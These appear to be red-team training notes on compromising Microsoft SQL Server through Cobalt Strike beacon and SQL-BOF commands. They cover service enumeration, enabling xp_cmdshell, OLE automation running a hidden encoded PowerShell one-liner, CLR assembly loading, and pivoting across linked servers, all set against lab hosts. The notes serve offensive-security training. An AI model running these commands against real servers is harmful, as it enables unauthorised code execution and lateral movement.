MSSQL is microsoft's proprietary relational database management system

tools to interact with MSSQL:
    https://github.com/NetSPI/PowerUpSQL, https://github.com/skahwah/SQLRecon, https://github.com/Tw1sm/SQL-BOF, https://github.com/microsoft/go-sqlcmd, https://www.heidisql.com/, https://learn.microsoft.com/en-us/ssms/download-sql-server-management-studio-ssms
this module focuses on SQL-BOF

enumeration:
    query for SPNs that support kerberos auth
        beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
            NOTE: this will return the hostname of the SQL servers and the service accounts used to run them
    portscan for ports known to host MSSQL
        beacon> portscan 10.10.120.0/23 1433 arp 1024
    if SQLBrower service (port 1434) is open we can query for info
        beacon> sql-1434udp 10.10.120.20
    with the public role, we can query directly
        beacon> sql-info lon-db-1
            NOTE: this will return server information
        beacon> sql-whoami lon-db-1
            NOTE: this will return our role(s) and permissions
        beacon> sql-query lon-db-1 "SELECT @@SERVERNAME"
            NOTE: sql-query allows us to directly query the service
    SQL-BOF commands:
        sql-databases: lists available databases
        sql-tables: lists tables in given database
        sql-columns: lists columns in given table
        sql-search: search columns based on keyword(s)

code execution via MSSQL (requires local admin on the SQL server or sysadmin role):
    xp_cmdshell (EXEC xp_cmdshell '<command>';):
        the only execution technique that can return output
        check if enabled:
            beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
                NOTE: 0 means disabled
        enable it:
            beacon> sql-enablexp lon-db-1
        interact with it:
            beacon> sql-xpcmd lon-db-1 "hostname && whoami"
        disable it:
            beacon> sql-disablexp lon-db-1
    object linking and embeding (OLE automation):
        technology that allows one application to link objects to another application
        we can interact with specific COM objects to run shell commands/spawn process/etc.
        check if enabled:
            beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
        enable it:
            beacon> sql-enableole lon-db-1
        interact with it (note there will be no output):
            beacon> sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"
        disable it:
            beacon> sql-disableole lon-db-1
    sql common language runtime (CLR):
        feature which allows stored procedures to be written in any .NET language (c#) and stored with the database
        check if enabled:
            beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
        enable it:
            beacon> sql-enableclr lon-db-1
        load and execute assembly:
            beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
        disable it:
            beacon> sql-disableclr lon-db-1

privilege escalation via MSSQL:
    we can enumerate linked servers for lateral movement
    enumerate linked servers:
        beacon> sql-links lon-db-1
    query the linked server:
        beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
    enumerate user permissions on linked server:
        beacon> sql-whoami lon-db-1 "" lon-db-2


